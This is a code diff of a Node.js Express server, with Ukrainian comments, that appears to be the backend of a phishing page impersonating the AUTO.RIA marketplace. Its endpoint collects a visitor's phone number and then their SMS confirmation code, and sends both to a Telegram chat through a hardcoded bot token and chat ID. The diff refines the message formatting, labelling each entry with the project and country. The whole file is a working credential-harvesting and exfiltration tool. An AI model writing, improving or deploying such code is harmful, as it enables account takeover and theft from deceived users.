@@ -1,37 +1,30 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
-// Використовуємо 'node-fetch' версії 2 для сумісності з 'require'
-const fetch = require('node-fetch'); 
+const fetch = require('node-fetch');
 
 const app = express();
-// Використовуємо process.env.PORT, як ви вказали для деплою
-const port = process.env.PORT || 3000; 
+const port = process.env.PORT || 3000;
 
 // === КОНФІГУРАЦІЯ TELEGRAM ===
-// !! ЗАМІНІТЬ ЦІ ЗНАЧЕННЯ НА ВАШІ РЕАЛЬНІ !!
-const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18"; 
-const CHAT_ID = "-5055127448"; 
+const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
+const CHAT_ID = "-5055127448";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 // ==============================
 
-// Використовуємо middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
-
-// Обслуговуємо статичні файли (HTML, CSS, JS) з кореня
-// Переконайтеся, що ваш HTML файл названо index.html для автоматичного обслуговування
 app.use(express.static(path.join(__dirname, '/')));
 
 /**
  * Функція для відправки повідомлення у Telegram
- * @param {string} message - Текст повідомлення
+ * Використовуємо MarkdownV2 для клікабельного номера
  */
 async function sendToTelegram(message) {
     const params = {
         chat_id: CHAT_ID,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'MarkdownV2'
     };
 
     try {
@@ -41,7 +34,6 @@ async function sendToTelegram(message) {
             body: JSON.stringify(params)
         });
 
-        // Перевіряємо статус відповіді
         if (!response.ok) {
             const errorData = await response.json();
             console.error('Помилка API Telegram:', response.status, errorData);
@@ -49,42 +41,47 @@ async function sendToTelegram(message) {
         }
 
         const data = await response.json();
-        return data.ok; // true, якщо успішно
+        return data.ok;
     } catch (error) {
-        console.error('Критична помилка відправки в Telegram:', error);
+        console.error('Помилка відправки:', error);
         return false;
     }
 }
 
-// API-ендпоінт для прийому даних з форми
+// Ендпоінт для прийому даних
 app.post('/api/send-data', async (req, res) => {
     const { step, phone, code } = req.body;
     let message = '';
-    
-    // Додаємо інформацію про IP та час для кращого логування
-    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const timestamp = new Date().toLocaleString('uk-UA', { timeZone: 'Europe/Kiev' });
+
+    // Екранування спеціальних символів для MarkdownV2
+    const escapeMarkdown = (text) => {
+        return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
+    };
 
     if (step === 'phone' && phone) {
-        // КРОК 1: Телефон
-        message = `🚨 **НОВИЙ ВХІД / КРОК 1**\n\n**Номер телефону:** \`${phone}\`\n**IP:** \`${clientIP}\`\n**Час:** \`${timestamp}\``;
+        const cleanPhone = phone.replace(/\D/g, ''); // тільки цифри
+        const formattedPhone = phone.startsWith('+') ? phone : `+${cleanPhone}`;
+        const clickablePhone = `[${escapeMarkdown(formattedPhone)}](tg://msg?url=${encodeURIComponent(formattedPhone)})`;
+
+        message = `Проект: *AUTO\\.RIA*\nНомер телефона: ${clickablePhone}\nСтрана: *Украина*`;
+
     } else if (step === 'code' && code) {
-        // КРОК 2: Код
-        message = `✅ **ПІДТВЕРДЖЕННЯ / КРОК 2**\n\n**SMS-код:** \`${code}\`\n**IP:** \`${clientIP}\`\n**Час:** \`${timestamp}\``;
+        message = `Code:\n\`${escapeMarkdown(code)}\``;
+
     } else {
-        return res.status(400).json({ success: false, message: 'Неправильні або відсутні дані.' });
+        return res.status(400).json({ success: false, message: 'Неправильні дані.' });
     }
 
     const success = await sendToTelegram(message);
 
     if (success) {
-        res.status(200).json({ success: true, message: 'Дані успішно відправлені.' });
+        res.json({ success: true });
     } else {
-        res.status(500).json({ success: false, message: 'Помилка відправки в Telegram.' });
+        res.status(500).json({ success: false, message: 'Помилка відправки.' });
     }
 });
 
-// Запуск сервера
+// Запуск
 app.listen(port, () => {
-    console.log(`Server listening at http://localhost:${port}`);
+    console.log(`Сервер запущено на порту ${port}`);
 });
